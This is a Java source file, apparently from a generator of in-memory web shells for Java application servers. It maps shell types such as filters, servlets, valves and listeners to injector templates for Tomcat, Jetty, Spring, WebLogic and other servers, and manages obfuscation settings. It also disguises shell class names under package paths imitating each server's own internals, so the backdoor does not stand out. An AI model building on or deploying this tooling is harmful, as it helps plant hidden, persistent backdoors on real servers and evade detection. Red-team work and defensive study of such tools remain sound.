package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.ShellTypeSuffix;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
import com.reajason.javaweb.utils.NameSampler;
import com.reajason.javaweb.utils.StringUtils;
import com.reajason.javaweb.utils.tuple.Pair;
import net.bytebuddy.jar.asm.Opcodes;

import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
public abstract class AbstractServer {

    private final Map<String, ToolMapping> map = new LinkedHashMap<>();

    /**
     * 定义注入器映射
     *
     * @return 注入器映射
     */
    public abstract InjectorMapping getShellInjectorMapping();

    public Class<?> getListenerInterceptor() {
        return null;
    }

    /**
     * 解析注入器模板字节所用的类加载器。
     * <p>
     * 插件模板可能继承宿主没有的框架类。生成期 {@code ByteBuddy.redefine} 需要解析模板父类，
     * 默认的 provider 类加载器看不到这些类时，覆写本方法返回一个能同时看到模板与框架桩的加载器。
     */
    public ClassLoader getInjectorTemplateClassLoader() {
        return getClass().getClassLoader();
    }

    /**
     * 该 server 能生成的最低 class 文件版本。
     * <p>
     * 模板使用 lambda 或 invokedynamic 时，低于 Java 8 的 class 版本写不出来。默认 Java 6，
     * 需要 Java 8 的 server 覆写为 {@link Opcodes#V1_8}，生成入口会把调用方给的低版本抬到这条线。
     */
    public int getMinimumTargetJreVersion() {
        return Opcodes.V1_6;
    }

    /**
     * 获取特定 shellType 下不可被混淆改名的方法契约（系统契约）。
     * <p>
     * 默认覆盖所有内置 shellType：壳类型本身就决定了容器回调入口（Filter/Servlet/Valve/
     * WebSocket/Interceptor/Netty 等），与具体中间件无关，因此无需每个 Server 重复声明。
     * 未知或为空的 shellType 返回 {@link MethodContracts#CONSERVATIVE} 兜底。
     * <p>
     * 唯一例外是 {@code Handler}/{@code JakartaHandler}：Jetty 与 Undertow 的入口方法不同，
     * 由对应 Server 覆写本方法，先单独判断 Handler 类型，再调用 {@code super} 复用默认映射。
     */
    public Set<MethodSignature> getShellMethodContracts(String shellType) {
        if (shellType == null) {
            return MethodContracts.CONSERVATIVE;
        }
        switch (shellType) {
            case FILTER:
            case JAKARTA_FILTER:
            case AGENT_FILTER_CHAIN:
            case WAS_AGENT_FILTER_MANAGER:
                return MethodContracts.FILTER_CONTRACTS;
            case LISTENER:
            case JAKARTA_LISTENER:
                return MethodContracts.LISTENER_CONTRACTS;
            case SERVLET:
            case JAKARTA_SERVLET:
                return MethodContracts.SERVLET_CONTRACTS;
            case VALVE:
            case JAKARTA_VALVE:
            case PROXY_VALVE:
            case JAKARTA_PROXY_VALVE:
            case CATALINA_AGENT_CONTEXT_VALVE:
                return MethodContracts.VALVE_CONTRACTS;
            case WEBSOCKET:
            case JAKARTA_WEBSOCKET:
                return MethodContracts.WEBSOCKET_CONTRACTS;
            case RAW_WEBSOCKET:
            case JAKARTA_RAW_WEBSOCKET:
                return MethodContracts.RAW_WEBSOCKET_CONTRACTS;
            case UPGRADE:
                return MethodContracts.UPGRADE_CONTRACTS;
            // Handler 入口因中间件而异（Jetty handle / Undertow handleRequest），默认保守兜底
            case HANDLER:
            case JAKARTA_HANDLER:
                return MethodContracts.CONSERVATIVE;
            case JETTY_AGENT_HANDLER:
                return MethodContracts.JETTY_HANDLER_CONTRACTS;
            case CUSTOMIZER:
                return MethodContracts.JETTY_CUSTOMIZER_CONTRACTS;
            case UNDERTOW_AGENT_SERVLET_HANDLER:
                return MethodContracts.UNDERTOW_HANDLER_CONTRACTS;
            case SPRING_WEBMVC_INTERCEPTOR:
            case SPRING_WEBMVC_JAKARTA_INTERCEPTOR:
                return MethodContracts.SPRING_INTERCEPTOR_CONTRACTS;
            case SPRING_WEBMVC_CONTROLLER_HANDLER:
            case SPRING_WEBMVC_JAKARTA_CONTROLLER_HANDLER:
                return MethodContracts.SPRING_CONTROLLER_CONTRACTS;
            case SPRING_WEBMVC_AGENT_FRAMEWORK_SERVLET:
                return MethodContracts.SPRING_FRAMEWORK_SERVLET_CONTRACTS;
            case SPRING_WEBFLUX_WEB_FILTER:
                return MethodContracts.SPRING_WEBFLUX_FILTER_CONTRACTS;
            case SPRING_WEBFLUX_HANDLER_METHOD:
                return MethodContracts.SPRING_WEBFLUX_HANDLER_METHOD_CONTRACTS;
            case SPRING_WEBFLUX_HANDLER_FUNCTION:
                return MethodContracts.SPRING_WEBFLUX_HANDLER_FUNCTION_CONTRACTS;
            case NETTY_HANDLER:
                return MethodContracts.NETTY_HANDLER_CONTRACTS;
            case ACTION:
                return MethodContracts.STRUTS2_CONTRACTS;
            case WEBLOGIC_AGENT_SERVLET_CONTEXT:
                return MethodContracts.WEBLOGIC_AGENT_SERVLET_CONTEXT_CONTRACTS;
            default:
                return MethodContracts.CONSERVATIVE;
        }
    }

    /**
     * 获取特定 shellType 下注入器需要通过反射按名读写的 shell 实例字段契约。
     * <p>
     * class-obf 没有字段黑名单能力，返回非空集合时该 shell 混淆会关闭字段名混淆。只应声明
     * 注入器反射访问的字段；shell 内部字节码自读自写的字段改名后仍能正常工作，不必声明。
     * <p>
     * 默认没有此类字段；Jetty Handler 这类注入器会回填 shell 字段的 Server 覆写本方法。
     */
    public Set<String> getShellFieldContracts(String shellType) {
        return Collections.emptySet();
    }

    /**
     * 获取特定 shellType 下注入器不可被混淆改名的方法契约
     */
    public Set<MethodSignature> getInjectorMethodContracts(String shellType) {
        return MethodContracts.INJECTOR_COMMON;
    }

    /**
     * 获取特定 shellType 生成期需要强制覆盖的 shell 混淆选项。
     * <p>
     * 用于 shell 会被 Agent 注入器 {@code defineClass} 进受限类加载器的类型：OSGi bundle loader
     * 只解析 bundle 自己 import 的包，通常看不到 {@code javax.crypto}，而 class-obf 开启 AES
     * 后会把 {@code Cipher}/{@code SecretKeySpec} 引用写进 shell 的 {@code <clinit>}，导致
     * shell 首次实例化时链接失败。返回的选项在生成时合并进 shell 混淆配置并覆盖用户配置；
     * 注入器自身不受影响（它运行在 attach 进来的 system loader 中，JDK 包可见）。
     *
     * @return 选项名到值的映射，默认无覆盖
     */
    public Map<String, Object> getShellObfuscationOptionOverrides(String shellType) {
        return Collections.emptyMap();
    }

    /**
     * shellBytes 生成完成后的 server 专属改写钩子：可改写字节码（如 Jetty Handler 按版本换父类）、
     * 向 {@code injectorConfig} 贡献 helper 类（如 WebSocket 绕过 helper）、调整 urlPattern。
     * 默认原样返回。
     *
     * @return 改写后的 shell 字节码
     */
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        return shellBytes;
    }

    /**
     * server 注入器字节生成后的专属改写钩子，用于按中间件版本替换父类等生成期无法用配置表达的处理。
     * 默认原样返回，混淆在内层完成后再进入后续流程。
     */
    public byte[] postProcessInjectorBytes(byte[] injectorBytes, ShellConfig shellConfig,
                                           ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        return injectorBytes;
    }

    /**
     * 为已注册的工具补充或覆盖 {@code shellType -> shell 模板}。键是工具名，值是工具映射。
     * <p>
     * 注册工具时，服务端不再只取「工具映射 ∩ 本服务端注入器类型」：这里声明的条目先落位，
     * 工具自己的映射只补缺失的类型。因此插件 server 可以给内置工具加一套自己的传输实现
     * （例如给 Godzilla 加 Akka HTTP 壳），不需要复制工具名、配置项与界面条目。
     * <p>
     * 覆盖是否生效仍受两条约束：类型必须在本服务端的 {@link #getShellInjectorMapping()} 里，
     * 且 shell 模板必须能找到。值为空时回退到工具自己的映射。默认没有覆盖。
     *
     * @return 工具名到 shell 模板映射的覆盖表
     */
    public Map<String, ToolMapping> getToolMappingOverrides() {
        return Collections.emptyMap();
    }

    public void addToolMapping(String shellTool, ToolMapping mapping) {
        map.put(shellTool, mapping);
    }

    /**
     * 获取内存马功能所支持的注入类型列表
     *
     * @param shellTool 内存马功能
     * @return shellTypes
     */
    public Set<String> getSupportedShellTypes(String shellTool) {
        ToolMapping toolMapping = map.get(shellTool);
        if (toolMapping == null) {
            return Collections.emptySet();
        }
        // 与 getShellInjectorPair 共用同一份过滤结果：缺少注入器模板的类型不能对外暴露，
        // 否则会广告出一个生成时必然失败的类型。这里同时检查模板字节是否存在，映射里写错类名
        // 时目录不会广告该类型。
        ClassLoader templateClassLoader = getInjectorTemplateClassLoader();
        Set<String> supported = new LinkedHashSet<String>();
        for (Map.Entry<String, Pair<String, String>> entry
                : toolMapping.getShellClassMap(getShellInjectorMapping()).entrySet()) {
            if (templateClassExists(templateClassLoader, entry.getValue().getRight())) {
                supported.add(entry.getKey());
            }
        }
        return Collections.unmodifiableSet(supported);
    }

    private static boolean templateClassExists(ClassLoader classLoader, String className) {
        if (StringUtils.isBlank(className)) {
            return false;
        }
        String resource = className.replace('.', '/') + ".class";
        return classLoader != null
                ? classLoader.getResource(resource) != null
                : ClassLoader.getSystemResource(resource) != null;
    }

    public Set<String> getSupportedShellTools() {
        return Collections.unmodifiableSet(map.keySet());
    }

    /**
     * @return left: shell template class name, right: injector template class name
     */
    public Pair<String, String> getShellInjectorPair(String shellTool, String shellType) {
        if (StringUtils.isBlank(shellTool)) {
            throw new IllegalArgumentException("shellTool is required");
        }
        ToolMapping mapping = map.get(shellTool);
        if (mapping == null) {
            throw new UnsupportedOperationException("please implement shell type: " + shellType + " for " + shellTool);
        }
        Map<String, Pair<String, String>> shellClassMap = mapping.getShellClassMap(getShellInjectorMapping());
        return shellClassMap.get(shellType);
    }

    /**
     * 生成内存马类名：类名会被放进与目标中间件同名的包下，让内存马在类加载器视角里不显突兀。
     * <p>
     * 结构为 {@code <中间件包名>.<包名段>.<前缀词><中段词><自然后缀>}，例如
     * {@code org.apache.http.web.handlers.session.SessionValidationFilter}。
     * 包名沿用各中间件自身常见的内部路径，让内存马在类加载器视角里不显突兀。
     * 自然后缀由 {@link ShellTypeSuffix} 抹掉 {@code Jakarta}/{@code Agent} 等生成器内部标记。
     *
     * @param serverName 中间件名称，取值见 {@link com.reajason.javaweb.Server}
     * @param shellType  内存马类型，用于推导类名后缀
     */
    public static String generateShellClassName(String serverName, String shellType) {
        return sampleShellClassName(getWebPackageName(serverName), shellType);
    }

    /**
     * 在 server 选定的包名里采样一个 shell 类名。实例钩子 {@link #getShellClassName} 走这里，
     * 插件覆写包名后仍然复用同一套采样规则。
     */
    public static String sampleShellClassName(String shellPackageName, String shellType) {
        NameSampler.SampledName name = NameSampler.sample(toClassNameSuffix(shellType));
        return shellPackageName
                + "." + name.getPackageSegment()
                + "." + name.getSimpleName();
    }

    /**
     * 该 server 的 shell 类名。默认复用静态映射，插件可覆写 {@link #getShellPackageName} 只换包名，
     * 或整体覆写本方法来控制完整类名。
     */
    public String getShellClassName(String serverName, String shellType) {
        return sampleShellClassName(getShellPackageName(serverName), shellType);
    }

    /**
     * shell 类所在包名。默认沿用内置中间件映射，插件 server 可以覆写成目标框架自己的包路径。
     */
    public String getShellPackageName(String serverName) {
        return getWebPackageName(serverName);
    }

    /**
     * 把自定义 shellType 规范成采样器接受的 PascalCase 后缀。
     * <p>
     * {@link ShellTypeSuffix#of} 对未登记类型原样返回，但自定义类型可能是
     * {@code my_filter} / {@code myFilter} 这类形式，直接交给 {@link NameSampler}
     * 会因正则或长度限制失败。这里只影响类名的“自然后缀”，不影响注入逻辑。
     */
    static String toClassNameSuffix(String shellType) {
        String suffix = ShellTypeSuffix.of(shellType);
        if (NameSampler.isValidSuffix(suffix)) {
            return suffix;
        }
        StringBuilder sanitized = new StringBuilder();
        for (String part : suffix.split("[^A-Za-z0-9]+")) {
            if (part.isEmpty()) {
                continue;
            }
            sanitized.append(Character.toUpperCase(part.charAt(0)));
            if (part.length() > 1) {
                sanitized.append(part.substring(1));
            }
        }
        if (sanitized.length() == 0) {
            return "Handler";
        }
        if (!Character.isJavaIdentifierStart(sanitized.charAt(0))) {
            sanitized.insert(0, "Custom");
        }
        return NameSampler.isValidSuffix(sanitized.toString()) ? sanitized.toString() : "Handler";
    }

    /**
     * 各中间件对应的、看起来像是框架自身组件的包名
     */
    public static String getWebPackageName(String serverName) {
        switch (serverName) {
            case Server.Jetty5:
                return "org.mortbay.jetty.servlet.handlers";
            case Server.Jetty:
                return "org.eclipse.jetty.servlet.handlers";
            case Server.Undertow:
                return "io.undertow.servlet.handlers";
            case Server.SpringWebMvc:
                return "org.springframework.boot.mvc.handlers";
            case Server.SpringWebFlux:
                return "org.springframework.boot.webflux.handlers";
            case Server.WebSphere:
                return "com.ibm.ws.webcontainer.handlers";
            case Server.WebLogic:
                return "weblogic.servlet.internal.handlers";
            case Server.Resin:
                return "com.caucho.server.dispatch.handlers";
            case Server.Resin2:
                return "com.caucho.server.http.handlers";
            case Server.BES:
                return "com.bes.enterprise.webtier.web.handlers";
            case Server.Apusic:
                return "com.apusic.web.handlers";
            case Server.InforSuite:
                return "com.cvicse.inforsuite.web.handlers";
            case Server.TongWeb:
                // com.tongweb.* 不被 TongWeb 的 LoadClassCache 缓存失败结果，保证先 loadClass
                // 探测、后 defineClass 的注入器仍能按类名解析到已定义的 shell
                return "com.tongweb.http.web.handlers";
            default:
                return "org.apache.http.web.handlers";
        }
    }
}
